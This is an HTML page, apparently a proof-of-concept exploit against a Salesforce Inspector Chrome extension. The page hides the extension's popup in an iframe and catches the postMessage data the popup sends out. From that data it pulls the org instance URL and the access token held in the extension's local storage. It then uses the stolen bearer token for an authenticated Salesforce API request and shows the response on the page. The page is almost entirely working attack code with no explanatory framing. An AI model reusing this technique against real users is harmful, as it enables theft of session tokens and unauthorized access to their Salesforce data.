<!DOCTYPE html>
<html>
<head>
    <title>SFDC Inspector Reloaded</title>
    <style>
        body { font-family: system-ui; max-width: 800px; margin: 20px auto; padding: 20px; }
        #messages { background: #f5f5f5; padding: 15px; border-radius: 4px; margin-bottom: 20px; }
        #requestInfo { 
            background: #e3f2fd;
            padding: 15px;
            border-radius: 4px;
            margin-top: 20px;
        }
        pre { white-space: pre-wrap; }
    </style>
</head>
<body>
    <div id="messages">Loading...</div>
    <div id="requestInfo"></div>
    <script>
        const messagesDiv = document.getElementById('messages');
        const requestInfoDiv = document.getElementById('requestInfo');
        
        function makeRequest(url, accessToken) {
            const xhr = new XMLHttpRequest();
            
            xhr.open('GET', `https://${url}/services/data/v61.0/limits`, true);
            
            // Add the authorization header with the access token
            xhr.setRequestHeader('Authorization', `Bearer ${accessToken}`);
            
            xhr.onreadystatechange = function() {
                requestInfoDiv.innerHTML += `
                    <h3>Request State ${xhr.readyState}:</h3>
                    <pre>Status: ${xhr.status}</pre>
                    <pre>Headers Sent: ${xhr.getAllRequestHeaders?.() || 'N/A'}</pre>
                    <pre>Headers Received: ${xhr.getAllResponseHeaders()}</pre>
                    <pre>Response: ${xhr.responseText}</pre>
                `;
            };
            
            xhr.onerror = function(e) {
                requestInfoDiv.innerHTML += `
                    <h3>Error:</h3>
                    <pre>${JSON.stringify(e, null, 2)}</pre>
                `;
            };
            
            try {
                xhr.send();
            } catch(e) {
                requestInfoDiv.innerHTML += `
                    <h3>Send Error:</h3>
                    <pre>${e.toString()}</pre>
                `;
            }
        }

        window.addEventListener('message', function(event) {
            if (event.data.insextInitRequest) {
                messagesDiv.innerHTML = '<pre>Init Request: ' + JSON.stringify(event.data, null, 2) + '</pre>';
                
                const storage = event.data.iFrameLocalStorage;
                
                // Look for both the instance URL and access token
                const hostKey = Object.keys(storage).find(key => key.endsWith('_orgInstance'));
                const tokenKey = Object.keys(storage).find(key => key.endsWith('_accessToken'));
                
                if (hostKey && tokenKey) {
                    const hostUrl = storage[hostKey];
                    const accessToken = storage[tokenKey];
                    
                    requestInfoDiv.innerHTML = `
                        <h3>Attempting authenticated request to:</h3>
                        <pre>https://${hostUrl}/services/data/v61.0/limits</pre>
                        <pre>Using token: ${accessToken.substring(0, 10)}...</pre>
                    `;
                    
                    makeRequest(hostUrl, accessToken);
                } else {
                    requestInfoDiv.innerHTML = `
                        <h3>Error: Missing required authentication information</h3>
                        <pre>Host Key Found: ${Boolean(hostKey)}</pre>
                        <pre>Token Key Found: ${Boolean(tokenKey)}</pre>
                        <pre>Available Storage Keys: ${JSON.stringify(Object.keys(storage), null, 2)}</pre>
                    `;
                }
            }
        });

        const initFrame = document.createElement('iframe');
        initFrame.src = 'chrome-extension://apfebnafilpofmbeebponacgbdhnkmnl/popup.html';
        initFrame.style.display = 'none';
        document.body.appendChild(initFrame);
    </script>
</body>
</html>
